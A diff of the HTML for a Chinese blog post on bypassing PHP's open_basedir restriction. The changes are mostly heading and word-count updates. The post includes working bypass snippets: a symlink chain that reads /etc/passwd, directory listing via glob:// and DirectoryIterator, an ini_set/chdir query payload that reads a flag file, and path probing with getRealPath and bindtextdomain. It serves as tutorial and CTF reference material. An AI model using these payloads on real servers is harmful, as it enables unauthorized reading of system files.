@@ -11,7 +11,7 @@
   <meta itemprop="name" content="php绕过open_basedir">
   <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
   <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
-  <meta itemprop="wordCount" content="807">
+  <meta itemprop="wordCount" content="795">
   <meta itemprop="keywords" content="代码审计,Php安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/24/">
   <meta property="og:site_name" content="东隅 Blog">
   <meta property="og:title" content="php绕过open_basedir">
@@ -37,7 +37,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/php\/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E\/24\/"
-    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, php安全","wordcount":  807 ,
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, php安全","wordcount":  795 ,
     "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/php\/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E\/24\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
       "@type": "Organization",
       "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
@@ -144,7 +144,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Php绕过open_basedir</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="807 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 900 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>4 minutes</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="795 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 800 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>4 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -152,59 +152,61 @@
         </div>
         <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li>
-      <ul>
-        <li></li>
-      </ul>
-    </li>
+    <li><a href="#系统命令执行">系统命令执行</a></li>
+    <li><a href="#蚁剑">蚁剑</a></li>
+    <li><a href="#symlink软链接">symlink()软链接</a></li>
+    <li><a href="#glob伪协议--仅目录">glob伪协议  仅目录</a></li>
+    <li><a href="#ini_set">ini_set</a></li>
+    <li><a href="#splfileinfogetrealpath--仅目录">SplFileInfo::getRealPath()  仅目录</a></li>
+    <li><a href="#暴力破解--仅目录">暴力破解  仅目录</a></li>
   </ul>
 </nav></div>
-      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="heading" class="heading-element"><span>0.0.0.1  </span>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h1 id="heading" class="heading-element"><span></span>
   <a href="#heading" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>它用于限制脚本能==访问==的文件系统路径，防止恶意脚本访问未授权的文件或目录。</p>
+</h1><p>它用于限制脚本能==访问==的文件系统路径，防止恶意脚本访问未授权的文件或目录。</p>
 <p>四种设置方法：https://blog.bfw.wiki/user6/15666150320594960063.html</p>
-<h5 id="应用" class="heading-element"><span>0.0.0.2  应用</span>
+<h1 id="应用" class="heading-element"><span>应用</span>
   <a href="#%e5%ba%94%e7%94%a8" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>一、多用户共享环境</p>
+</h1><p>一、多用户共享环境</p>
 <p>通过设置每个用户的 <code>open_basedir</code> 为其分配的目录，可以确保每个用户无法访问其他用户的文件。例如，如果用户A的网站文件存放在 <code>/home/userA/public_html/</code> 目录下，可以在用户A的虚拟主机配置或 <code>.htaccess</code> 文件中设置：</p>
 <pre tabindex="0"><code>php_admin_value open_basedir &#34;/home/userA/public_html/&#34;</code></pre><p>二、Web安全</p>
 <p>假设有一个 Web 应用程序，其所有文件都存放在 <code>/var/www/html/</code> 目录下。为了确保应用程序的安全，可以在应用程序的虚拟主机配置或 <code>.htaccess</code> 文件中设置：</p>
 <pre tabindex="0"><code>php_admin_value open_basedir &#34;/var/www/html/&#34;</code></pre><p>三、上传文件处理</p>
 <p>​    假设有一个文件上传功能，上传的文件应该存储在 <code>/var/www/html/uploads/</code> 目录中。为了确保上传的文件只能保存在指定的目录中，可以在上传文件处理的 PHP 脚本中设置 <code>open_basedir</code>：</p>
-<pre tabindex="0"><code>ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/uploads/&#39;);</code></pre><h5 id="限制了什么" class="heading-element"><span>0.0.0.3  限制了什么</span>
+<pre tabindex="0"><code>ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/uploads/&#39;);</code></pre><h1 id="限制了什么" class="heading-element"><span>限制了什么</span>
   <a href="#%e9%99%90%e5%88%b6%e4%ba%86%e4%bb%80%e4%b9%88" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p><code>open_basedir</code> 限制脚本可读写文件的目录，PHP中有关文件读、写的函数都会经过open_basedir的检查，本质上是一个黑名单，对于统计进这个机制的函数或者姿势进行过滤。</p>
+</h1><p><code>open_basedir</code> 限制脚本可读写文件的目录，PHP中有关文件读、写的函数都会经过open_basedir的检查，本质上是一个黑名单，对于统计进这个机制的函数或者姿势进行过滤。</p>
 <p>ps:注意用open_basedir指定的限制实际上是前缀,而不是目录名。
 比如open_basedir = /dir/user&quot;, 那么目录 &ldquo;/dir/user&rdquo; 和 &ldquo;/dir/user1&quot;都是可以访问的</p>
-<h5 id="绕过" class="heading-element"><span>0.0.0.4  绕过</span>
+<h1 id="绕过" class="heading-element"><span>绕过</span>
   <a href="#%e7%bb%95%e8%bf%87" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><blockquote>
+</h1><blockquote>
 <p>在php5.3以后很少有能够绕过open_basedir读写文件的方法。</p>
 </blockquote>
-<h6 id="系统命令执行" class="heading-element"><span>0.0.0.4.1  系统命令执行</span>
+<h2 id="系统命令执行" class="heading-element"><span>系统命令执行</span>
   <a href="#%e7%b3%bb%e7%bb%9f%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p><code>open_basedir</code>和命令执行无关，如system函数</p>
+</h2><p><code>open_basedir</code>和命令执行无关，如system函数</p>
 <p>但是一般都会禁用命令执行函数</p>
-<h6 id="蚁剑" class="heading-element"><span>0.0.0.4.2  蚁剑</span>
+<h2 id="蚁剑" class="heading-element"><span>蚁剑</span>
   <a href="#%e8%9a%81%e5%89%91" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>蚁剑disable_functions，GC_UAF和Backtrace_UAF都是可以用</p>
-<h6 id="symlink软链接" class="heading-element"><span>0.0.0.4.3  symlink()软链接</span>
+</h2><p>蚁剑disable_functions，GC_UAF和Backtrace_UAF都是可以用</p>
+<h2 id="symlink软链接" class="heading-element"><span>symlink()软链接</span>
   <a href="#symlink%e8%bd%af%e9%93%be%e6%8e%a5" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><blockquote>
+</h2><blockquote>
 <p>symlink(string <code>$target</code>, string <code>$link</code>): bool</p>
 <p><strong>symlink()</strong> 对于已有的 <code>target</code> 建立一个名为 <code>link</code> 的符号连接。</p>
 <ul>
@@ -246,11 +248,11 @@
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">symlink</span>(<span style="color:#a6be9d">&#39;foo/../../../../../../&#39;</span>,<span style="color:#a6be9d">&#39;bar&#39;</span>);
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">unlink</span>(<span style="color:#a6be9d">&#39;foo&#39;</span>);
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">symlink</span>(<span style="color:#a6be9d">&#39;/var/www/html&#39;</span>,<span style="color:#a6be9d">&#39;foo&#39;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#58a1dd">file_get_contents</span>(<span style="color:#a6be9d">&#39;bar/etc/passwd&#39;</span>);</span></span></code></pre></div><h6 id="glob伪协议--仅目录" class="heading-element"><span>0.0.0.4.4  glob伪协议  仅目录</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#58a1dd">file_get_contents</span>(<span style="color:#a6be9d">&#39;bar/etc/passwd&#39;</span>);</span></span></code></pre></div><h2 id="glob伪协议--仅目录" class="heading-element"><span>glob伪协议  仅目录</span>
   <a href="#glob%e4%bc%aa%e5%8d%8f%e8%ae%ae--%e4%bb%85%e7%9b%ae%e5%bd%95" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>glob伪协议在筛选目录时不受open_basedir制约，缺点在于==只能列目录==,且大多只能列根目录</p>
+</h2><p>glob伪协议在筛选目录时不受open_basedir制约，缺点在于==只能列目录==,且大多只能列根目录</p>
 <p><strong>以下payload可在php5.3以上读取仅针对linux根目录的目录</strong></p>
 <p><code>DirectoryIterator</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
@@ -285,11 +287,11 @@
 </span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">closedir</span>(<span style="color:#58a1dd">$b</span>);
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
-</span></span></code></pre></div><h6 id="ini_set" class="heading-element"><span>0.0.0.4.5  ini_set</span>
+</span></span></code></pre></div><h2 id="ini_set" class="heading-element"><span>ini_set</span>
   <a href="#ini_set" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><blockquote>
+</h2><blockquote>
 <p>从php底层去研究ini_set属于web-pwn的范畴了</p>
 </blockquote>
 <p><strong>注意</strong>：<strong>这里的chdir(&rdquo;..&quot;);数量据具体环境修改，一般要求是如果再chdir一次就进入根目录为止，比如php文件的位置为/www/admin/localhost_80/wwwroot/html/下,那么就要使用五次chdir(&quot;..&quot;);</strong></p>
@@ -307,11 +309,11 @@
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">var_dump</span>(<span style="color:#58a1dd">$a</span>);
 </span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
 </span></span></code></pre></div><pre tabindex="0"><code>?c=ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);print_r(scandir(&#39;/&#39;));
-?c=ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);print_r(file_get_contents(&#39;/THis_Is_tHe_F14g&#39;));</code></pre><h6 id="splfileinfogetrealpath--仅目录" class="heading-element"><span>0.0.0.4.6  SplFileInfo::getRealPath()  仅目录</span>
+?c=ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);print_r(file_get_contents(&#39;/THis_Is_tHe_F14g&#39;));</code></pre><h2 id="splfileinfogetrealpath--仅目录" class="heading-element"><span>SplFileInfo::getRealPath()  仅目录</span>
   <a href="#splfileinfogetrealpath--%e4%bb%85%e7%9b%ae%e5%bd%95" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>(PHP 5 &gt;= 5.1.2, PHP 7, PHP 8)</p>
+</h2><p>(PHP 5 &gt;= 5.1.2, PHP 7, PHP 8)</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">ini_set</span>(<span style="color:#a6be9d">&#39;open_basedir&#39;</span>, <span style="color:#58a1dd">dirname</span>(<span style="color:#58a1dd">__FILE__</span>));
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">printf</span>(<span style="color:#a6be9d">&#34;open_basedir: %s &lt;br/&gt;&lt;br/&gt;&#34;</span>, <span style="color:#58a1dd">ini_get</span>(<span style="color:#a6be9d">&#39;open_basedir&#39;</span>));
@@ -324,11 +326,11 @@
 </span></span><span style="display:flex;"><span>    <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">$re</span>) {
 </span></span><span style="display:flex;"><span>        <span style="color:#ff636f">echo</span> <span style="color:#58a1dd">$re</span><span style="color:#ff636f">.</span><span style="color:#a6be9d">&#34;&lt;br&gt;&#34;</span>;
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><h6 id="暴力破解--仅目录" class="heading-element"><span>0.0.0.4.7  暴力破解  仅目录</span>
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><h2 id="暴力破解--仅目录" class="heading-element"><span>暴力破解  仅目录</span>
   <a href="#%e6%9a%b4%e5%8a%9b%e7%a0%b4%e8%a7%a3--%e4%bb%85%e7%9b%ae%e5%bd%95" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>对于windows系统</p>
+</h2><p>对于windows系统</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">ini_set</span>(<span style="color:#a6be9d">&#39;open_basedir&#39;</span>, <span style="color:#58a1dd">dirname</span>(<span style="color:#58a1dd">__FILE__</span>));
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">printf</span>(<span style="color:#a6be9d">&#34;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&#34;</span>, <span style="color:#58a1dd">ini_get</span>(<span style="color:#a6be9d">&#39;open_basedir&#39;</span>));
@@ -373,11 +375,11 @@
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">$re</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">bindtextdomain</span>(<span style="color:#a6be9d">&#39;xxx&#39;</span>, <span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;dir&#39;</span>]);
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">var_dump</span>(<span style="color:#58a1dd">$re</span>);
 </span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
-</span></span></code></pre></div><h5 id="p牛exp" class="heading-element"><span>0.0.0.5  p牛exp</span>
+</span></span></code></pre></div><h1 id="p牛exp" class="heading-element"><span>p牛exp</span>
   <a href="#p%e7%89%9bexp" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>多php版本读目录和读文件</p>
+</h1><p>多php版本读目录和读文件</p>
 <p>用法：</p>
 <ul>
 <li>读目录  传?dir=/       这种</li>
